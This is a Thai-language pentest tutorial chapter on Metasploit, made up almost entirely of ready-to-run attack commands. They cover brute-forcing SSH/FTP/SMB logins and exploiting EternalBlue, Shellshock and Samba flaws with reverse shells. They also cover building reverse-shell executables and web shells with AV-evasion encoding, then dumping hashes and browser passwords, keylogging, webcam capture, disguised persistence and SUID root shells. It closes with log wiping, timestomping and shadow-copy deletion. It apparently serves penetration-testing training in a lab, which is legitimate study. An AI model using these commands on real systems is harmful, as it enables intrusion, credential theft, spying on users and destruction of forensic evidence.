# Part 08: Metasploit Framework (Steps 71-80)

## บทนำ

Metasploit Framework คือ Platform สำหรับการพัฒนา ทดสอบ และใช้งาน Exploits เป็นเครื่องมือมาตรฐานที่ทุก Pentester ต้องรู้จัก ในบทนี้จะเรียนรู้ตั้งแต่พื้นฐานจนถึงการใช้งานขั้นสูง

---

## Step 71: Metasploit Architecture

### ทำความรู้จัก Metasploit

```bash
# ==========================================
# Metasploit Framework Components
# ==========================================

# Core:
# - msfconsole    - Main interface
# - msfvenom      - Payload generator
# - msfdb         - Database management
# - msfupdate     - Update framework

# Directory Structure:
# /usr/share/metasploit-framework/
# ├── modules/
# │   ├── auxiliary/     - Supporting tools
# │   ├── exploits/      - Exploit modules
# │   ├── payloads/      - Payloads
# │   ├── encoders/      - Payload encoders
# │   ├── nops/          - NOP generators
# │   ├── post/          - Post-exploitation
# │   └── evasion/       - AV evasion
# ├── lib/               - Libraries
# ├── data/              - Data files
# └── plugins/           - Plugins

# ==========================================
# Module Types
# ==========================================

# Exploits   - ใช้ vulnerability เข้าถึง system
# Payloads   - code ที่รันหลัง exploit
# Auxiliary  - scanning, sniffing, fuzzing
# Post       - post-exploitation
# Encoders   - encode payloads
# NOPs       - No Operation (buffer)
# Evasion    - bypass AV/security

# ==========================================
# เริ่มต้นใช้งาน
# ==========================================

# ตั้งค่า database ก่อน
sudo msfdb init
sudo msfdb start
sudo msfdb status

# เปิด msfconsole
msfconsole
msfconsole -q               # ไม่แสดง banner

# ==========================================
# Basic Commands
# ==========================================

# Help
help
help search

# ค้นหา modules
search apache
search ms17-010
search type:exploit platform:windows

# ใช้งาน module
use exploit/windows/smb/ms17_010_eternalblue

# ดูข้อมูล module
info
info exploit/windows/smb/ms17_010_eternalblue

# ดู options
show options
show advanced
show payloads
show targets

# ตั้งค่า options
set RHOSTS 192.168.1.1
set RPORT 445
set LHOST 192.168.1.100
set LPORT 4444

# รัน
run
exploit

# Background session
background
Ctrl+Z

# ดู sessions
sessions
sessions -l

# Interact กับ session
sessions -i 1

# Kill session
sessions -k 1
```

---

## Step 72: Database & Workspace

```bash
# ==========================================
# Metasploit Database
# ==========================================

# ตรวจสอบ database status
db_status

# สร้าง workspace
workspace -a pentest_lab
workspace -l
workspace pentest_lab

# Import nmap scan
db_nmap -sV -sC 192.168.1.0/24

# ดูผลจาก database
hosts                                # ดู hosts
hosts -c address,os_name,name
services                             # ดู services
services -p 80                       # เฉพาะ port 80
vulns                                # ดู vulnerabilities
creds                                # credentials ที่พบ
loot                                 # ไฟล์ที่ได้มา
notes                                # notes

# Export results
hosts -o hosts_export.csv
services -o services_export.csv
creds -o creds_export.csv

# Nmap scan จาก msfconsole
db_nmap -sV -sC -p 1-1000 192.168.1.1
db_nmap -A 192.168.1.0/24

# ==========================================
# Automation
# ==========================================

# Resource script (.rc file)
cat > ~/scan_exploit.rc << 'EOF'
db_nmap -sV -p 445 192.168.1.0/24
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run
EOF

msfconsole -r ~/scan_exploit.rc
```

---

## Step 73: Auxiliary Modules

```bash
# ==========================================
# Auxiliary Modules - Scanning & Enumeration
# ==========================================

# ==========================================
# Port Scanning
# ==========================================

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# SYN scan
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
run

# ==========================================
# Service Scanning
# ==========================================

# HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run

# ==========================================
# Brute Force Modules
# ==========================================

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.1
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run

# FTP brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.1
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# SMB brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.1
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# MySQL brute force
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.1
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# HTTP form brute force
use auxiliary/scanner/http/http_login
set RHOSTS example.com
set TARGETURI /login
set USERNAME admin
set WORDLIST /usr/share/wordlists/rockyou.txt
run

# ==========================================
# Vulnerability Checking
# ==========================================

# MS17-010 (EternalBlue) check
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Shellshock check
use auxiliary/scanner/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.0/24
run

# Heartbleed check
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.1.0/24
run

# Anonymous FTP
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run

# Open relay SMTP
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS 192.168.1.0/24
run

# ==========================================
# Enumeration
# ==========================================

# SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.1
run

# SMB users
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.1
run

# SNMP walk
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.0/24
set COMMUNITY public
run

# DNS zone transfer
use auxiliary/gather/dns_brutefore
set DOMAIN example.com
run
```

---

## Step 74: Exploit Modules

### Using Exploits

```bash
# ==========================================
# EternalBlue - MS17-010 (Windows SMB)
# ==========================================

# ตรวจสอบก่อน
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.x
run

# Exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.x
set LHOST 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
show options
exploit

# ==========================================
# MS08-067 (Windows XP/2003)
# ==========================================

use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.x
set LHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# ==========================================
# Apache Struts (CVE-2017-5638)
# ==========================================

use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 192.168.1.x
set TARGETURI /struts2-showcase/fileupload/doUpload.action
set LHOST 192.168.1.100
set PAYLOAD linux/x64/meterpreter/reverse_tcp
exploit

# ==========================================
# UnrealIRCd Backdoor
# ==========================================

use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.1.x
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.1.100
exploit

# ==========================================
# Tomcat Manager Upload
# ==========================================

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.x
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST 192.168.1.100
set PAYLOAD java/meterpreter/reverse_tcp
exploit

# ==========================================
# PHP CGI Argument Injection
# ==========================================

use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 192.168.1.x
set LHOST 192.168.1.100
set PAYLOAD php/meterpreter/reverse_tcp
exploit

# ==========================================
# Heartbleed
# ==========================================

use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.1.x
set VERBOSE true
run
```

---

## Step 75: Payloads & Meterpreter

### Payload Types

```bash
# ==========================================
# Payload Types
# ==========================================

# Singles (standalone, no stage needed)
# windows/shell/bind_tcp
# windows/exec

# Stagers (ดาวน์โหลด stage)
# windows/meterpreter/reverse_tcp

# Stages (ดาวน์โหลดโดย stager)
# meterpreter

# ==========================================
# Common Payloads
# ==========================================

# Windows Meterpreter
windows/meterpreter/reverse_tcp          # TCP reverse
windows/x64/meterpreter/reverse_tcp      # 64-bit
windows/meterpreter/reverse_https        # HTTPS (stealthy)
windows/meterpreter/bind_tcp             # Bind

# Linux Meterpreter
linux/x64/meterpreter/reverse_tcp
linux/x64/meterpreter_reverse_tcp        # stageless

# PHP
php/meterpreter/reverse_tcp
php/meterpreter_reverse_tcp

# Python
python/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# ==========================================
# Meterpreter Commands
# ==========================================

# System
sysinfo                        # ข้อมูลระบบ
getuid                         # current user
getpid                         # process ID
ps                             # process list
pwd                            # current directory

# File System
ls                             # list files
cd path                        # change directory
cat file                       # read file
download file /local/path      # ดาวน์โหลดไฟล์
upload /local/file remote/path # อัพโหลดไฟล์
mkdir directory                # สร้างโฟลเดอร์
rm file                        # ลบไฟล์
edit file                      # แก้ไขไฟล์
search -f *.txt                # ค้นหาไฟล์
search -f password.txt -d c:\\  # ค้นหาใน directory

# Network
ifconfig                       # network interfaces
ipconfig                       # windows
route                          # routing table
arp                            # ARP cache
netstat                        # connections
portfwd add -l 3306 -p 3306 -r 192.168.1.x  # port forward

# Privilege Escalation
getsystem                      # ลอง elevate privileges
getprivs                       # ดู privileges

# User & Process
getuid                         # current user
migrate PID                    # ย้ายไปยัง process อื่น
steal_token PID                # steal token
drop_token                     # drop token

# Credential Dumping
run post/multi/recon/local_exploit_suggester  # ดู local exploits
run post/windows/gather/hashdump              # dump hashes
hashdump                                       # dump SAM hashes (Windows)
run post/linux/gather/hashdump                # Linux passwd

# Persistence
run post/windows/manage/persistence_exe
run post/windows/manage/persistence

# Pivoting
route add 10.0.0.0/8 session_id
use auxiliary/server/socks_proxy

# Screenshoot
screenshot
record_mic
webcam_list
webcam_snap
webcam_stream

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Shell
shell                          # เปิด system shell
exit                           # กลับไป meterpreter
```

---

## Step 76: msfvenom - Payload Generator

```bash
# ==========================================
# msfvenom - Standalone Payload Generator
# ==========================================

# List payloads
msfvenom --list payloads

# List formats
msfvenom --list formats

# List encoders
msfvenom --list encoders

# ==========================================
# Windows Payloads
# ==========================================

# EXE (Reverse TCP)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f exe -o shell.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f dll -o shell.dll

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f psh -o shell.ps1

# VBScript
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f vbs -o shell.vbs

# ==========================================
# Linux Payloads
# ==========================================

# ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f elf -o shell.elf

chmod +x shell.elf

# Python
msfvenom -p python/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw -o shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw > shell.sh

# ==========================================
# Web Payloads
# ==========================================

# PHP
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f asp -o shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f war -o shell.war

# ==========================================
# Encoding (AV Evasion)
# ==========================================

# ใช้ encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e x64/xor_dynamic -i 3 \
    -f exe -o encoded_shell.exe

# Multiple iterations
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e x64/xor_dynamic -i 10 \
    -f exe -o encoded_shell.exe

# ==========================================
# Listener Setup
# ==========================================

# Simple listener
msfconsole -x "
use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
set LHOST 192.168.1.100;
set LPORT 4444;
set ExitOnSession false;
exploit -j"

# หรือผ่าน msfconsole:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j          # -j = run in background (job)
```

---

## Step 77: Post-Exploitation พื้นฐาน

```bash
# ==========================================
# Post-Exploitation Framework
# ==========================================

# ==========================================
# System Enumeration
# ==========================================

# สำหรับ Windows (ใน meterpreter)
run post/windows/gather/enum_system
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_drives
run post/windows/gather/enum_applications
run post/windows/gather/enum_shares
run post/windows/gather/enum_services

# สำหรับ Linux
run post/linux/gather/enum_system
run post/linux/gather/enum_configs
run post/linux/gather/enum_network
run post/linux/gather/enum_users_history

# General
run post/multi/gather/env
run post/multi/recon/local_exploit_suggester

# ==========================================
# Privilege Escalation Suggestions
# ==========================================

# ดู local exploits ที่อาจใช้ได้
run post/multi/recon/local_exploit_suggester

# สำหรับ Windows
run post/windows/escalate/getsystem

# ==========================================
# Credential Dumping
# ==========================================

# Windows SAM Database (ต้อง SYSTEM)
hashdump

# Windows - secretsdump
run post/windows/gather/credentials/credential_collector
run post/windows/gather/smart_hashdump

# Mimikatz (ต้องใช้ module)
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
wifi_list

# Linux Password Files
run post/linux/gather/hashdump
# อ่านไฟล์โดยตรง
cat /etc/passwd
cat /etc/shadow

# ==========================================
# Pivoting & Tunneling
# ==========================================

# Setup route ผ่าน compromised host
route add 10.0.0.0 255.255.255.0 1    # 1 = session ID

# SOCKS Proxy
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 1080
set VERSION 5
run

# ใช้กับ proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT 10.0.0.0/24

# ==========================================
# Persistence
# ==========================================

# Windows Registry Run Key
run post/windows/manage/persistence_exe STARTUP=REGISTRY

# Windows Scheduled Task
use exploit/windows/local/scheduled_task
set SESSION 1
set TASKNAME "WindowsUpdate"
run

# Linux Cron
run post/linux/manage/cron_persistence
```

---

## Step 78: การโจมตี Windows ด้วย Metasploit

```bash
# ==========================================
# Windows Enumeration
# ==========================================

# หลังจากเข้าถึงได้แล้ว:
sysinfo
getuid
run post/windows/gather/enum_system
run post/windows/gather/enum_logged_on_users

# ==========================================
# Windows Token Manipulation
# ==========================================

# Impersonation
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
impersonate_token "DOMAIN\\Administrator"

# ==========================================
# Pass-the-Hash
# ==========================================

# ใช้ hash แทน password
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.x
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
exploit

# ==========================================
# Windows Command Execution
# ==========================================

# ใน shell/meterpreter
shell
whoami /all
net user
net localgroup administrators
net share
tasklist /SVC
ipconfig /all
arp -a
netstat -ano
systeminfo

# PowerShell ใน meterpreter
load powershell
powershell_execute "Get-Process"
powershell_execute "Get-LocalUser"
powershell_execute "Get-NetIPAddress"

# ==========================================
# Extract Saved Credentials
# ==========================================

# Chrome Saved Passwords
run post/windows/gather/credentials/chrome

# Firefox
run post/windows/gather/credentials/firefox

# Windows Credential Manager
run post/windows/gather/credentials/credential_collector

# Outlook/Email
run post/windows/gather/outlook

# VNC Passwords
run post/windows/gather/credentials/vnc
```

---

## Step 79: การโจมตี Linux ด้วย Metasploit

```bash
# ==========================================
# Linux Exploitation
# ==========================================

# Shellshock (CGI)
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.x
set TARGETURI /cgi-bin/test.cgi
set LHOST 192.168.1.100
set PAYLOAD linux/x64/meterpreter/reverse_tcp
exploit

# Samba Usermap Script
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.x
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.1.100
exploit

# Distcc (compiler daemon)
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.1.x
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.1.100
exploit

# ==========================================
# Linux Post-Exploitation
# ==========================================

# Enumeration
run post/linux/gather/enum_system
run post/linux/gather/enum_configs
run post/linux/gather/enum_network
run post/linux/gather/enum_users_history

# Credentials
run post/linux/gather/hashdump
run post/linux/gather/credentials/credential_collector

# SUID files
find / -perm -u=s -type f 2>/dev/null

# Sudo
sudo -l

# Cron
cat /etc/crontab
ls -la /etc/cron.*

# Environment Variables
env
cat ~/.bashrc
cat ~/.bash_history

# SSH Keys
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
ls -la ~/.ssh/

# ==========================================
# Privilege Escalation - Linux
# ==========================================

# SUID exploitation example
# หาไฟล์ SUID
find / -perm -u=s -type f 2>/dev/null

# ทดสอบด้วย GTFOBins
# https://gtfobins.github.io/

# nmap SUID (เก่า)
nmap --interactive
!sh

# vim SUID
vim -c ':!/bin/sh'

# python SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# bash SUID
bash -p

# cp SUID
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p
```

---

## Step 80: Armitage - Metasploit GUI

```bash
# ==========================================
# Armitage - Metasploit GUI
# ==========================================

# ติดตั้ง
sudo apt install armitage

# เริ่ม MSF database ก่อน
sudo msfdb init

# เปิด Armitage
sudo armitage

# Features:
# - Visual network map
# - Team collaboration
# - Automated exploitation
# - Post-exploitation GUI

# ==========================================
# Cobalt Strike (Commercial)
# ==========================================

# Cobalt Strike คือ commercial version ของ Armitage
# ใช้ในงาน Red Team จริง
# Features:
# - Beacon C2
# - Malleable C2 profiles
# - Team server
# - Advanced pivoting
# - Reporting

# ==========================================
# Metasploit Pro (Commercial)
# ==========================================

# Metasploit Pro เพิ่ม:
# - Web UI
# - Automated scanning
# - Social engineering campaigns
# - Advanced reporting
# - Integration with 3rd party tools

# ==========================================
# MSF Scripts & Automation
# ==========================================

# สร้าง automation script
cat > ~/msf_automation.rb << 'EOF'
framework = Msf::Simple::Framework.create

exploit = framework.exploits.create('windows/smb/ms17_010_eternalblue')
exploit.datastore['RHOSTS'] = '192.168.1.x'
exploit.datastore['LHOST'] = '192.168.1.100'
exploit.datastore['LPORT'] = '4444'

exploit.exploit_simple(
    'Payload' => 'windows/x64/meterpreter/reverse_tcp',
    'RunAsJob' => true
)
EOF

# ==========================================
# Best Practices
# ==========================================

# 1. ทดสอบใน lab ก่อนเสมอ
# 2. บันทึกทุก action
# 3. ใช้ session ที่สะอาด
# 4. Set LHOST ให้ถูกต้อง
# 5. ใช้ HTTPS payloads สำหรับ stealthy
# 6. ทำ cleanup หลัง pentest
# 7. Report ทุก vulnerability ที่พบ

# Cleanup commands
run post/multi/manage/shell_to_meterpreter
clearev                           # ลบ event logs (Windows)
timestomp filename.txt -z         # เปลี่ยน timestamps
run post/windows/manage/delete_shadow_copies  # ลบ shadow copies
```

---

## สรุป Part 08

ในบทนี้คุณได้เรียนรู้:

✅ **Step 71**: Metasploit Architecture  
✅ **Step 72**: Database & Workspace  
✅ **Step 73**: Auxiliary Modules  
✅ **Step 74**: Exploit Modules  
✅ **Step 75**: Payloads & Meterpreter  
✅ **Step 76**: msfvenom  
✅ **Step 77**: Post-Exploitation พื้นฐาน  
✅ **Step 78**: Windows Exploitation  
✅ **Step 79**: Linux Exploitation  
✅ **Step 80**: Automation & GUI  

## แบบฝึกหัด (ใน Lab Environment)

1. Exploit Metasploitable2 ด้วย Samba Usermap Script
2. ใช้ msfvenom สร้าง reverse shell payload
3. ทำ post-exploitation dump hashes บน Windows
4. ตั้งค่า pivoting ผ่าน compromised host
5. สร้าง resource script สำหรับ automated exploitation

## ถัดไป: Part 09 - Privilege Escalation

---

*Part 08 | Steps 71-80 | ระดับ: กลาง-สูง*
